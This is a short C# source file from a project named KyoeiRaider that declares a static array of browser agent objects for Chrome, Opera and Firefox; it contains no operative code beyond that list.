using KyoeiRaider.Browser.Browsers;

namespace KyoeiRaider.Browser
{
    internal class StaticBrowsers
    {
        public static BrowserAgent[] BROWSERS = new BrowserAgent[]
        {
            new ChromeBrowser(),
            new OperaBrowser(),
            new FireFoxBrowser()
        };
    }
}
